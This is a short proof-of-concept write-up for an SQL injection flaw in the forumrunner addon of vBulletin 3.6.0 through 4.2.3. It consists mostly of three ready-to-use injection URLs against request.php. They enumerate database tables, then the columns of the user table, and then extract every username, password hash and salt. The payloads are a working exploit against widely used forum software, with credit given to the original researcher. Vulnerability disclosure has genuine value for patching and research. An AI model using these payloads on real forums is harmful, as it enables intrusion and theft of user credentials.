# vBulletin-forum-runner-SQL-Injection
VBulletin version 3.6.0 through 4.2.3 are vulnerable to SQL injection vulnerability in vBulletin core forumrunner addon. 
Vulnerability was analized and documented by Dantalion (https://enumerated.wordpress.com/2016/07/11/1/) 
so credit goes to Dantalion only :) 

////////////////
///  POC   ////
///////////////

SQL Injection payload to enumerate table names
----------------------------------------------
http://forum_directory/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.tables)where (table_schema=database()) and (0x00) in (@x:=concat(@x,0x3c62723e,table_name))))x),5,6,7,8,9,10-- -


SQL Injection payload to enumerate column names from table "user"
----------------------------------------------------------------
http://forum_directory/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.columns)where (table_name=0x75736572) and (0x00) in (@x:=concat(@x,0x3c62723e,column_name))))x),5,6,7,8,9,10-- -


SQL Injection payload to enumerate username,password hash and salt from "user" table
----------------------------------------------------------------------------------
http://forum_directory//forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (user)where (0x00) in (@x:=concat(@x,0x3c62723e,username,0x3a,password,0x3a,salt))))x),5,6,7,8,9,10-- -

/////////////////
exploit code ends here
